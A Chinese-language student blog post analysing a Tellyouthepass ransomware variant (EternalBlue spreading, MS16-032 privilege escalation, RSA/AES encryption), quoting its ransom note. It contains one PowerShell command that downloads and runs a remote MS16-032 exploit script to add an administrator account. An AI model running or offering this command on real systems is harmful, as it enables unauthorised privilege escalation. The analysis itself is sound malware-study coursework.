---
categories: 二进制
date: 2022-02-07 17:21:10
layout: post
tags: null
title: Ransomware analysis
---

对某勒索软件进行分析，题目来源于`恶意软件`课程的大作业。

包含两个文件，名称分别如下

```python
0a0d5d2d3c663c54a92cb11f7102eb39
6b9dbf198890b690358fcfc943167373
```

搜索发现其是Tellyouthepass勒索病毒的变种。

腾讯安全在[此文章](http://www.hackdig.com/07/hack-103589.htm)中说，攻击者利用压缩工具打包exe的方式，将`ms16-032内核提权漏洞利用模块`、`永恒之蓝内网扩散模块`集成到勒索攻击包中，以实现内网蠕虫式病毒传播。

但是之后就没再找到更详细的分析文章了。



解压缩，得到如下三个文件。awindows_privedge.exe会启动剩下的两个文件。
![1-software](/Ransomware_analysis/1-software.png)

## 1、lantools_exp.exe---永恒之蓝

参考文章[1]给出如下分析

```python
该模块为针对smb进行攻击利用的工具集，其中包含了对smb服务的远程探测，smb登录psexec命令执行，端口扫描，http服务搭建等功能，同时该工具包含了永恒之蓝漏洞高危漏洞（MS17-010）的攻击利用，该模块运行后将进行内网蠕虫扩散debug.exe病毒模块。
```



## 2、awindows_privedge.exe---提权

查看其导入表，发现有和privilege和token相关的函数。

查看硬编码的字符串，发现和ms16-032提权漏洞相关的内容。攻击者的目的是以system权限执行其他攻击模块。

![2-ms16-032](/Ransomware_analysis/2-ms16-032.png)



随后尝试在windows7上进行ms16-032提权漏洞复现。

首先查看XX用户的信息

```python
net user XX
```

打开powershell执行如下语句

```python
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c net localgroup administrators px /add'" 
```

出现如下错误，url解析错误，原来的网址已经无法访问了。

![3-failed](/Ransomware_analysis/3-failed.png)



参考教程：https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html

此外没找到对漏洞详细的分析文章，都是一条命令直接利用。就先不看这里啦～



## 3、勒索模块---加密

debug.exe解压缩，得到windbug.exe和debug.bat。

![4-debug](/Ransomware_analysis/4-debug.png)

debug.bat的内容为：`start C:\Windows\windebug.exe`，而windebug.exe是主要的勒索模块。

ida打开windbug.exe，查看字符串，推断其是由go语言所编写的。



在sub_500CD0()函数中找到了让受害者支付比特币的字符串

![5-pay](/Ransomware_analysis/5-pay.png)

```python
"<html>\n<head>\n<title>\nRecovery your files.\n</title>\n<style type=\"text/css\">\n\t.main {height:auto; width:100%;word-wrap:break-word}\n</style>\n</head>\n<body>\n<font color=#8B0000>\n<b>I am so sorry ! All your files have been encryptd by RSA-1024 and AES-256 due to a computer security problems.</b></br>\n<b>If you think your data is very important .The only way to decrypt your file is to buy my decrytion tool .</b></br>\n<b>else you can delete your encrypted data or reinstall your system.</b></br>\n</br>\n<h2>Your personid :</h2>\n<div class=\"main\">\n<b>ITSSHOWKEY</b></div></br>\n</br>\n</br>\n<h2>Decrytion do as follows:</h2>\n<b>1. if you not own bitcoin,you can buy it online on some websites. like https://localbitcoins.net/ or https://www.coinbase.com/  .</b></br>\n<b>2. send ITSBTC btc to my wallet address ITSADDR.</b></br>\n<b>3. send your btc transfer screenshots and your persionid to my email ITSEMAIL . i will send you decrytion tool.</b></br>\n</br>\n</br>\n<h2>Tips:</h2>\n<b>1.don't rename your file </b></br>\n<b>2.you can try some software to decrytion . but finally you will kown it's vain . </b></br>\n<b>3.if any way can't to contact to me .you can try send me bitcoin and paste your email in the transfer information. i will contact you and send you decrytion tools.</b></br>\n</br>\n</br>\n<b>Anything you want to help . please send mail to my email ITSEMAIL.</b></br>\n<b>Have a nice day . </b>\n</font>\n<body>\n</html>\n",
```



下文描述一些加密方式。

还是关注勒索模块，检查字符串发现有如下的字符串

```python
rsa.PrecomputedValues
crypto/aes
crypto/rsa
```

并且根据之前的文字提示

```python
All your files have been encryptd by RSA-1024 and AES-256 due to a computer security problems.
```

推测由AES和RSA加密。

在 sub_503530 中，恶意代码在用户机器上为用户生成 RSA-1024 公私钥pk_user/sk_user，保存在两个全局变量 dword_5F7F50、dword_5F7F54 中。

![6-rsa](/Ransomware_analysis/6-rsa.png)



RSA2048公钥如下：

![7-rsa_pub](/Ransomware_analysis/7-rsa_pub.png)

更加详细的加密方式可查阅参考文章[1]。

恶意软件整体的流程可查阅参考文章[2]，包括退出当前程序，扫描目录，设置白名单等。

自己目前水平还是太低，没有找到更加详细的分析文章，同时也不具备独立分析的能力，只能理解到这个程度了。还是需要努力学习哇！！

## 参考文章

【1】[Tellyouthepass勒索病毒利用永恒之蓝漏洞来袭，已有企业受害](http://www.hackdig.com/07/hack-103589.htm)

【2】[[TellYouThePass勒索病毒样本分析](https://bbs.360.cn/thread-15831380-1-1.html)](https://bbs.360.cn/thread-15831380-1-1.html)